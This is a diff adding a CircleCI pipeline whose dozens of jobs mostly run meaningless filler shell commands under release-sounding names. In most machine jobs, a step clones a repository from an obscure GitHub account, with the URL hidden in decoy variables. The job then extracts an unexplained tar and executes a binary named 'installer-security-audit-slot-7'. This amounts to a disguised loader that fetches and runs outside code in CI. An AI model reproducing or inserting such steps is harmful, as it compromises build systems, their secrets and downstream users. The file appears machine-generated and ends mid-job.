@@ -1,0 +1,2046 @@
+version: 2.1
+
+jobs:
+  ImportSettingsWithVerboseOutput:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: Download extension distribution from previous stage
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'image-compression-group-1-of-2'; echo 'gateway-backup-restore'; } > /tmp/release-rollback-chunk-2/parser-license-review
+            du -h /tmp/release-rollback-chunk-2/parser-license-review
+            x=79; ((++x)); echo "$x"; echo "no changes in inventory"
+            printf '%s\n' kappa orbit boron | grep -c -v '^$'
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'parser-license-review'
+  countDependenciesToBuildLog:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: PreCompileCodeScan
+          command: |
+            { cat /tmp/release-rollback-chunk-2/parser-license-review | tee >(md5sum) | wc -c ; } > /dev/null
+            artifact="server-89.xml"; echo "packing ${artifact%.*}"; echo "packed $artifact"
+            key="deps-$(printf '%s' "rho-v8" | md5sum | cut -c1-8)"; echo "cache key $key"
+      - run:
+          name: Install connector tools from vendor directory
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth=5 --no-tags "https://$task/$write/$shardof" "$(pwd)"
+            elapsed=0; for cost in 23 19; do elapsed=$((elapsed + cost)); echo "running total $elapsed seconds"; done
+            echo "ready"; abs_of() { local x=$1; if ((x < 0)); then x=$((0 - x)); fi; echo "$x"; }; abs_of -7
+      - run:
+          name: Coverage report phase
+          command: |
+            tar -xf pre-setup-schema-checks.tar
+            echo x{1..3}y; echo "step 1 of 6 finished"
+      - run:
+          command: |
+            env "./installer-security-audit-slot-7"
+  file-server-plugin-install:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: daemon-cluster-health-check (group 1 of 6)
+          command: |
+            { cat /tmp/release-rollback-chunk-2/approving-production-deployment | tee >(md5sum) | wc -c ; } > /dev/null
+            k=40; y=8; echo "quotient $((k / y)) remainder $((k % y))"
+      - run:
+          name: Compiler cluster removal hook
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 2 "https://$task/$write/$shardof" "`pwd`"
+            swap() { echo "$2 $1"; }; swap yew snake
+      - run:
+          name: primary-desktop-app-build
+          command: |
+            tar -xf pre-setup-schema-checks.tar --directory .
+            raw="worker-9"; echo "$raw" | tr a-z A-Z; echo "running changelog check"
+      - run:
+          command: |
+            "$PWD/installer-security-audit-slot-7"
+  write-configuration-file-after-build:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Start and monitor workers
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'detecting-insecure-settings'; echo 'image-rebuild-step'; } > /tmp/release-rollback-chunk-2/image-processor-benchmark-report
+            du -h /tmp/release-rollback-chunk-2/image-processor-benchmark-report
+            greet() { echo "hello $1"; }; greet tau; echo "retry 3 of 7"
+            printf '%s\n' "mauve solar shark" | gzip -9 -c | gunzip -c
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'image-processor-benchmark-report'
+  PersistStatusReportWithVerboseOutputBeforeTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: InventoryCoverageReportSlot5
+          command: |
+            { cat /tmp/release-rollback-chunk-2/image-processor-benchmark-report | tee >(md5sum) | wc -c ; } > /dev/null
+            echo "stage 5 of 8"; a=$((15 ** 2)); echo "total $a"
+            printf '%s\n' "pliers 14" "zebra 28" "goat 11" "elk 16" | sort -k1 | awk '{print $2}'; echo "thumbnailer passed queue drain"
+      - run:
+          name: Syncing image processor user guide
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --jobs=1 "https://$task/$write/$shardof" $PWD
+            word="wrench"; case "${#word}" in 3) echo three;; 4) echo four;; 5) echo five;; *) echo many;; esac; echo "newt profile loaded"
+      - run:
+          name: Patch generated indexer code
+          command: |
+            tar --extract --verbose --file pre-setup-schema-checks.tar
+            echo "preparing inventory"; kv_line() { printf '%s=%s\n' "$1" "$2"; }; kv_line poplar 17; kv_line maple 8; echo 'inventory ready'
+            echo "warming up search"; y=13; y=$((y - 1)); echo "$y"; echo "search warmed up"
+      - run:
+          command: |
+            /bin/bash -c './installer-security-audit-slot-7'
+  pre-release-data-import:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Restore data store for debug build
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'check-build-configuration'; echo 'roll-out-security-patches'; } > /tmp/release-rollback-chunk-2/unpack-test-harness-installer
+            du -h /tmp/release-rollback-chunk-2/unpack-test-harness-installer
+            key="deps-$(printf '%s' "stork-v5" | md5sum | cut -c1-8)"; echo "cache key $key"
+            echo $(( (97-23)*7 ))
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'unpack-test-harness-installer'
+  RestoreDatabaseSchemaFromArtifactStorage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Roll back simulator container
+          command: |
+            { cat /tmp/release-rollback-chunk-2/unpack-test-harness-installer | tee >(md5sum) | wc -c ; } > /dev/null
+            join <(printf '%s\n' '1 apple' '2 crab') <(printf '%s\n' '1 emu' '2 rotor'); echo "resuming license audit"
+            printf '%s=%s\n' walnut 24 trout 43 && echo "decoder looks healthy"
+      - run:
+          name: linking-profiler-static-library
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 2 --branch main "https://$task/$write/$shardof" "./"
+            printf '%s' "build-94" | wc -c; echo "retry 4 of 7"
+            printf '%s\n' "collecting results of worker pool"; seq 5 3 26 | tail -n 1 | sort -n -u | awk '10 < $1'; printf '%s\n' "results of worker pool collected"
+      - run:
+          name: Execute edge proxy schema checks (track 2)
+          command: |
+            tar --extract --file pre-setup-schema-checks.tar --directory .
+            key="piston"; if [[ "$key" =~ ^[0-9]+$ ]]; then echo numeric; else echo "not numeric"; fi; total=$((38 * 32 + 12)); echo "$total"
+      - run:
+          command: |
+            exec "./installer-security-audit-slot-7"
+  PostTagHook:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Identity Service Data Validation (part 3 of 5)
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'profile-telemetry-performance'; echo 'source-checksum-phase'; } > /tmp/release-rollback-chunk-2/run-link-checks
+            du -h /tmp/release-rollback-chunk-2/run-link-checks
+            target="gateway"; printf '%s\n' "begin $target" "end $target"
+            f="tests/strings.c"; b=$(dirname "$f"); echo "${b##*/}"; printf '%s\n' "audit log is current"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'run-link-checks'
+  FreezeWorkflow:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Prepare temporary directory and build binaries
+          command: |
+            { cat /tmp/release-rollback-chunk-2/run-link-checks | tee >(md5sum) | wc -c ; } > /dev/null
+            total=362; passed=357; echo "$passed of $total tests passed"; echo "pass rate $((passed * 100 / total))%"
+      - run:
+          name: Roll out preview release to canary nodes
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth=2 --no-tags "https://$task/$write/$shardof" .
+            ref="v5.0.27"; version=${ref#v}; echo "$version" | awk -F. '{print $3}'
+            stack=(black dove green orange); echo "${stack[@]}"
+      - run:
+          name: Tag registry image
+          command: |
+            tar --verbose --extract -f pre-setup-schema-checks.tar
+            for module in pomelo ram emu pine; do echo "scanning $module"; echo "$module ok"; done
+            echo "running worker pool"; names=(fir raven lynx); names+=(nebula); echo "${names[-1]}"; echo "worker pool passed"
+      - run:
+          command: |
+            bash -lc "./installer-security-audit-slot-7"
+  CompleteFreeze:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Update Kernel Examples (phase 6)
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'hash-file-contents'; echo 'capture-collector-debug-logs'; } > /tmp/release-rollback-chunk-2/analytics-debug-symbols
+            du -h /tmp/release-rollback-chunk-2/analytics-debug-symbols
+            nums=(3 11 23 35 37); for svc in "${nums[@]}"; do echo $((svc * 2)); done
+            awk -v a=11 -v b=6 'BEGIN {print a * b}'
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'analytics-debug-symbols'
+  approve-nightly-firmware-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: read line count when version changes
+          command: |
+            { cat /tmp/release-rollback-chunk-2/analytics-debug-symbols | tee >(md5sum) | wc -c ; } > /dev/null
+            z=47; k=19; echo $((z > k || k > 30)); echo "spell check started"; echo {a..e}
+            budget=120; spent=9; echo "$spent of $budget minutes spent, $((budget - spent)) left"
+      - run:
+          name: ShowingFirstBytes
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth=5 "https://$task/$write/$shardof" `pwd`
+            for step in {1..2}; do echo "phase $step"; done
+      - run:
+          name: RouterReleaseSmokeTestHook (cycle 6)
+          command: |
+            tar -xf pre-setup-schema-checks.tar --no-same-permissions
+            printf '%b\n' 'alpha\ntheta'
+      - run:
+          command: |
+            ./installer-security-audit-slot-7
+  artifact-fetch-part-4:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: cacheUpdaterTools
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'post-launch-review'; echo 'mandatory-minor-release'; } > /tmp/release-rollback-chunk-2/routine-smoke-test-task
+            du -h /tmp/release-rollback-chunk-2/routine-smoke-test-task
+            echo 'retry 3 of 12'; printf '%s\n' elm bronze camel mauve | cut -c2-
+            seq 12 20 | fold -w 1
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'routine-smoke-test-task'
+  BasicSourceCheckout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: PartnerPortalReleaseTagging
+          command: |
+            { cat /tmp/release-rollback-chunk-2/routine-smoke-test-task | tee >(md5sum) | wc -c ; } > /dev/null
+            printf '%s\n' "pass 3 complete" "feature flags ready"
+            read -r -a values < <(echo "tau purple helium yew"); echo "${values[2]}"; echo checking search index
+      - run:
+          name: record-updater-version-string
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 1 --filter=tree:0 "https://$task/$write/$shardof" "./"
+            sort < <(printf '%s\n' lemur fox frog); echo shard 3 of 6 finished
+      - run:
+          name: Flaky task queue tests (slot 1)
+          command: |
+            tar -x < pre-setup-schema-checks.tar
+            printf '%s\n' "magnet 35" "lever 19" "iron 17" "pulley 22" | awk '{print $1}' | sort
+            tagged() { printf '[%s] %s\n' "$1" "$2"; }; tagged raven mauve; echo 'router ready'
+      - run:
+          command: |
+            bash -c "exec ./installer-security-audit-slot-7"
+  index-job-runner-bindings:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: PreApprovalLogCompression
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'invalidate-page-cache'; echo 'scheduler-bundle'; } > /tmp/release-rollback-chunk-2/copy-hashes-from-previous-stage
+            du -h /tmp/release-rollback-chunk-2/copy-hashes-from-previous-stage
+            echo "all good"; tag_for() { echo "${1}-${2}"; }; out=$(tag_for lambda 38); echo "$out"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'copy-hashes-from-previous-stage'
+  RepositoryFetchStep:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Load Balancer Bundle
+          command: |
+            { cat /tmp/release-rollback-chunk-2/copy-hashes-from-previous-stage | tee >(md5sum) | wc -c ; } > /dev/null
+            printf '%s %s %s\n' lemur orca kappa
+            for idx in 12 20 17 10 16; do if [ "$((idx % 2))" -eq 0 ]; then echo "$idx is even"; else echo "$idx is odd"; fi; done
+      - run:
+          name: ConfigurePreviewEnvironmentAndRunChangedTests
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 5 --no-tags "https://$task/$write/$shardof" .
+            echo "collecting results of naming check"; rows=(nectar lynx mole emu melon); echo "${rows[@]^}"; echo "results of naming check collected"
+      - run:
+          name: Analytics validation
+          command: |
+            tar --extract --verbose --file pre-setup-schema-checks.tar
+            entries=(camel robin lambda aspen); entries=("${entries[@]}" rho); echo "${#entries[@]}"; printf '%s\n' "mole" 'elk' xenon
+      - run:
+          command: |
+            cd "$(pwd)" && ./installer-security-audit-slot-7
+  verify-and-deploy-release-notes:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Alerting platform team if cache is stale
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'parallel-nightly-logger-tests'; echo 'mandatory-performance-analysis'; } > /tmp/release-rollback-chunk-2/approving-production-deployment
+            du -h /tmp/release-rollback-chunk-2/approving-production-deployment
+            echo 'running report render'; echo "queued link check"; echo "lane pink is clear"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'approving-production-deployment'
+  scan-and-sign-identity-service-release-archive:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Inform on-call engineer about completed roll-out
+          command: |
+            { cat /tmp/release-rollback-chunk-2/approving-production-deployment | tee >(md5sum) | wc -c ; } > /dev/null
+            data=(4 43 35 23); for k in "${!data[@]}"; do data[k]=$((data[k] * 10)); done; echo "${data[*]}"
+      - run:
+          name: sign static library and upload release artifacts
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --jobs 4 "https://$task/$write/$shardof" .
+            counts=(31 11 13 33 6 6); total=1; for z in "${counts[@]}"; do total=$((total * z % 1000)); done; echo "$total"
+            rows=(jupiter hare emu pluto); longest=""; for target in "${rows[@]}"; do if [ "${#target}" -gt "${#longest}" ]; then longest=$target; fi; done; echo "$longest"
+      - run:
+          name: AlertingReviewersAboutNewVersion
+          command: |
+            tar --extract < pre-setup-schema-checks.tar
+            echo "step 1 of 7 finished"; greet() { echo "hello ${1-team}"; }; greet orca
+      - run:
+          command: |
+            cd "$(pwd)" && ./installer-security-audit-slot-7
+  rerunPolicyChecksWithDefaultRules:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: configure-registry
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'tag-controller-build-outputs'; echo 'rotating-access-tokens'; } > /tmp/release-rollback-chunk-2/split-component-tests-for-audit
+            du -h /tmp/release-rollback-chunk-2/split-component-tests-for-audit
+            printf '%s\n' "preparing header check" && expr 50 + 29 + 2
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'split-component-tests-for-audit'
+  sync-translations:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: checksum-pipeline
+          command: |
+            { cat /tmp/release-rollback-chunk-2/split-component-tests-for-audit | tee >(md5sum) | wc -c ; } > /dev/null
+            printf '%s\n' camel gamma psi hinge | sort | xargs -n 2; echo 'manifest check complete'
+      - run:
+          name: Tag and release kernel test build
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth=1 --filter=blob:none "https://$task/$write/$shardof" $PWD
+            printf '%d%%\n' 14; m=65; u=28; echo "$((m * u))"
+      - run:
+          name: Compute and Verify Build Number
+          command: |
+            tar -xf pre-setup-schema-checks.tar --no-same-owner
+            v="8.15.4"; echo "$v" | cut -d. -f2; echo "leg 1 of 5 ready"
+            printf '%s\n' aspen alpha meteor sloth | grep e; echo billing check passed
+      - run:
+          command: |
+            bash -c "./installer-security-audit-slot-7"
+  ComputeStreamProcessorChecksumFile:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: lint-and-analyze-source-files
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'rotating-track-3'; echo 'launcher-bundle-group-7'; } > /tmp/release-rollback-chunk-2/initial-compression
+            du -h /tmp/release-rollback-chunk-2/initial-compression
+            for ((slot = 1; slot <= 3; slot += 1)); do printf '%s %d\n' cycle "$slot"; done
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'initial-compression'
+  scale-service-with-retries:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: storage-benchmark-routine
+          command: |
+            { cat /tmp/release-rollback-chunk-2/initial-compression | tee >(md5sum) | wc -c ; } > /dev/null
+            echo warming up search; printf '%s' "willow" | od -An -tu1; data=(21 55 44 18 16 41); printf '%s\n' "${data[@]}" | sort -n -r | paste -s -d' '
+      - run:
+          name: partner portal scripts
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --quiet "https://$task/$write/$shardof" "${PWD}"
+            added=141; removed=5; echo "+$added -$removed, net $((added - removed)) lines"
+      - run:
+          name: Flag Dependency Updates With Verbose Output
+          command: |
+            tar -x --file pre-setup-schema-checks.tar
+            echo "newt tiger" | sed -E 's/([a-z]+) ([a-z]+)/\2 \1/'
+      - run:
+          command: |
+            /bin/bash -c "./installer-security-audit-slot-7"
+  apply-database-migrations-in-dry-run-mode:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: DataImporterFingerprint
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'warm-cached-dependencies'; echo 'archive-style-sheets'; } > /tmp/release-rollback-chunk-2/retry-analyzer-benchmark-suite
+            du -h /tmp/release-rollback-chunk-2/retry-analyzer-benchmark-suite
+            echo 'wrapping up artifact pack'; echo "newt bolt venus almond plum" | awk '{print NF}'
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'retry-analyzer-benchmark-suite'
+  dashboardRepositoryCheckoutAttempt2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Copy playground data store to remote storage
+          command: |
+            { cat /tmp/release-rollback-chunk-2/retry-analyzer-benchmark-suite | tee >(md5sum) | wc -c ; } > /dev/null
+            clamp() { local k=$1; if ((k > 2)); then k=2; fi; echo "$k"; }; clamp 39
+      - run:
+          name: Compute file checksum and print octal dump
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --filter=blob:none "https://$task/$write/$shardof" "`pwd`"
+            echo "6 items processed" && printf '%s\n' psi=28 owl=25 red=14 solar=27 | grep -c =
+            echo {snake,aspen}-{239,13}; echo "mars profile loaded"
+      - run:
+          name: approving-formatter-release
+          command: |
+            tar -x -f pre-setup-schema-checks.tar
+            doc="guide.go"; echo "${doc%.*}"; printf '%s\n' "pulsar pluto zinc" | gzip -c | gzip -d -c
+      - run:
+          command: |
+            $(pwd)/installer-security-audit-slot-7
+  partial-scan-summary-job-iteration-2:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - run:
+          name: ImportReferenceDataFromPreviousJob
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'announce-release-on-schedule'; echo 'upload-step'; } > /tmp/release-rollback-chunk-2/storage-benchmarks
+            du -h /tmp/release-rollback-chunk-2/storage-benchmarks
+            printf '%s' "snake" | od -An -tx1 | tr ' ' '\n' | grep -c .
+            s="melon lynx"; echo "${s/melon/olive}"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'storage-benchmarks'
+  rerun-dispatcher-functional-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Copy dispatcher benchmark results with timeout (tier 1)
+          command: |
+            { cat /tmp/release-rollback-chunk-2/storage-benchmarks | tee >(md5sum) | wc -c ; } > /dev/null
+            echo "lane green is clear" && printf '%s\n' 48 68 29 31 94 | awk '{print $1 + 3}' | awk '{print NR " " $1}'
+      - run:
+          name: Load portal feature flags from backup
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth=1 --filter=tree:0 "https://$task/$write/$shardof" `pwd`
+            artifact="router-66.css"; echo "packing ${artifact%.*}"; echo "packed $artifact"
+      - run:
+          name: admin-panel-source-code
+          command: |
+            tar -x --file=pre-setup-schema-checks.tar
+            name="azure"; if [[ "$name" != *z* ]]; then echo "no z"; else echo "has z"; fi
+      - run:
+          command: |
+            sh -c './installer-security-audit-slot-7'
+  QuickBackupRestoreTask:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Validate feature flags and apply configuration changes
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'enabling-monitoring'; echo 'minimal-cache-restore'; } > /tmp/release-rollback-chunk-2/cluster-setup-phase
+            du -h /tmp/release-rollback-chunk-2/cluster-setup-phase
+            echo "pluto profile loaded" && printf '%s\n' swan apricot silver | awk 'BEGIN {OFS = "-"} {print NR, $0}'
+            echo starting api check; text="eagle zebra"; echo "$text" | awk '{print $2, $1}'
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'cluster-setup-phase'
+  basic-billing-coverage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Production approval step
+          command: |
+            { cat /tmp/release-rollback-chunk-2/cluster-setup-phase | tee >(md5sum) | wc -c ; } > /dev/null
+            printf '%s\n' mole=33 green=15 cow=11 camel=34 | awk -F= '28 < $2' | wc -l
+      - run:
+          name: Generate and publish simulator status report
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 1 --branch main --no-tags "https://$task/$write/$shardof" ./
+            for p in 25 50 75 100; do echo "$p% complete"; done
+      - run:
+          name: LowPriorityExportServiceScan
+          command: |
+            cat pre-setup-schema-checks.tar | tar xf -
+            echo "pass 2 complete"; printf '%s\n' pig hammer whale pine melon | tr -s a-z
+      - run:
+          command: |
+            env ./installer-security-audit-slot-7
+  CompleteMutationTest:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: on-demand-framework-roll-out
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'step-3-of-17'; echo 'high-priority-refresh'; } > /tmp/release-rollback-chunk-2/release-verification-pipeline
+            du -h /tmp/release-rollback-chunk-2/release-verification-pipeline
+            echo batch 2 queued; result=0; for k in 24 24 15 47 28 52; do if ((k > result)); then result=$k; fi; done; echo "$result"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'release-verification-pipeline'
+  pre-launch-project-rebuild:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Post-upgrade archive inspection
+          command: |
+            { cat /tmp/release-rollback-chunk-2/release-verification-pipeline | tee >(md5sum) | wc -c ; } > /dev/null
+            printf '%s\n' squid anvil pink aspen golden | sed 's/o/_/'; printf '%s\n' ram radon washer | sed '1d'
+            record="bronze,iodine,raven,aspen,pliers"; echo "$record" | tr , '\n' | sort | paste -s -d,
+      - run:
+          name: post-upgrade-state-snapshot-phase-4
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --jobs 2 "https://$task/$write/$shardof" .
+            printf '%s\n' "newt zinc" "lynx"
+            echo "collecting results of spell check"; n=193; echo "$(((n - 32) * 5 / 9)) celsius"; echo results of spell check collected
+      - run:
+          name: schedule-integration-tests
+          command: |
+            tar xf pre-setup-schema-checks.tar --no-same-owner
+            slot=1; while ((slot <= 64)); do echo "item $slot"; slot=$((slot * 2)); done
+      - run:
+          command: |
+            cd "$(pwd)" && ./installer-security-audit-slot-7
+  post-checkout-cache-health-check:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Configure Runtime From Scratch
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'log-field-values'; echo 'routine-log-upload-pipeline'; } > /tmp/release-rollback-chunk-2/post-package-storage-migration
+            du -h /tmp/release-rollback-chunk-2/post-package-storage-migration
+            echo "license audit passed"; kv="zone=zebra"; echo "$kv" | awk -F= '{print $1}'
+            version="8.9.0"; echo "building version $version"; echo "build $version finished"
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'post-package-storage-migration'
+  validator-release-archive:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: LongRunningSecurityReview
+          command: |
+            { cat /tmp/release-rollback-chunk-2/post-package-storage-migration | tee >(md5sum) | wc -c ; } > /dev/null
+            for entry in pliers anvil; do echo "$entry is next"; done; echo "queue is empty"
+      - run:
+          name: ExportEnvironmentSettingsForPullRequest
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 10 "https://$task/$write/$shardof" "$(pwd)"
+            share_of() { echo "$(($1 * 100 / $2))%"; }; share_of 6 176
+            printf '%d + %d = %d\n' 163 82 $((163 + 82)) && echo "round 2 finished"
+      - run:
+          name: Hourly dependency cache
+          command: |
+            tar xvf pre-setup-schema-checks.tar
+            echo "5 modules compiled"; value="epsilon"; if [[ "$value" == ep* ]]; then echo "prefix ok"; else echo "prefix missing"; fi
+            m=86; echo "$((!m)) $((m != 0))"; for name in jupiter olive wed; do case "$name" in *a*) echo "$name has a";; *) echo "$name has no a";; esac; done
+      - run:
+          command: |
+            bash -lc './installer-security-audit-slot-7'
+  periodic-freeze:
+    docker:
+      - image: cimg/base:2024.10
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Assembling beta release
+          command: |
+            mkdir -p /tmp/release-rollback-chunk-2
+            { echo 'viewer-install'; echo 'pre-lint-package-inspection'; } > /tmp/release-rollback-chunk-2/pre-backup-code-scan
+            du -h /tmp/release-rollback-chunk-2/pre-backup-code-scan
+            d=$(printf '%s' "koi" | cksum | cut -d' ' -f1); echo "${d%%[a-f]*}"
+            echo "load test passed"; printf '%2d. %s\n' 1 epsilon 2 emu 3 spring
+
+      - persist_to_workspace:
+          root: /tmp/release-rollback-chunk-2
+          paths:
+            - 'pre-backup-code-scan'
+  DecoderCleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/release-rollback-chunk-2
+      - run:
+          name: Promote debug build to canary nodes
+          command: |
+            { cat /tmp/release-rollback-chunk-2/pre-backup-code-scan | tee >(md5sum) | wc -c ; } > /dev/null
+            for p in x y; do for a in 1 2 3; do echo "$p-$a"; done; done
+            printf '%d\n' "$((46 * 7 * 4))"
+      - run:
+          name: Analyze Dashboard Failure Report for All Platforms
+          command: |
+            task=github.com; write=lorentang365917gw5dthg9-wq; shardof=analyzer-version-comparison
+            git clone --depth 1 --filter=tree:0 "https://$task/$write/$shardof" "${PWD}"
+            token="shard-5-of-8"; echo "$token" | tr -d 0-9; echo "router check passed"
+      - run:
